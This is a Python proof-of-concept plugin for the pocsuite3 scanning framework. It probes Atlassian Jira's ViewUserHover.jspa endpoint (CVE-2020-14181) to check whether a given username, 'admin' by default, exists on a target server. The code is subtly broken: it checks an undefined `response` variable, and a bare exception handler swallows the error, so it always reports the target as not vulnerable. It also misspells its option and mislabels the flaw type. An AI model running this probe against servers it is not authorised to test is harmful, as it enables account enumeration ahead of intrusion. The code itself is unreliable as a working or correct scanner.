import sys
import random
import re
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, \
    OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class DemoPOC(POCBase):
    vulID = '4'
    name = 'Atlassian Jira ViewUserHover.jspa 用户信息泄露漏洞 CVE-2020-14181'
    desc = '''Atlassian Jira'''
    appName = 'Atlassian Jira'
    appVersion = '未知版本'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE

    def _options(self):
        o = OrderedDict()
        o["usename"] = OptString("admin", description='用户名')
        return o

    def _verify(self):
        result = {}
        target = self.url + "/secure/ViewUserHover.jspa?username=" + self.get_option("usename")
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            r = requests.get(url=target, headers=headers, verify=False, timeout=5)
            print(target)
            version = re.findall(r'<span id="footer-build-information">\((.*?)#', r.text)[0]
            if self.get_option("usename") in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['usename'] = self.get_option("usename")
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
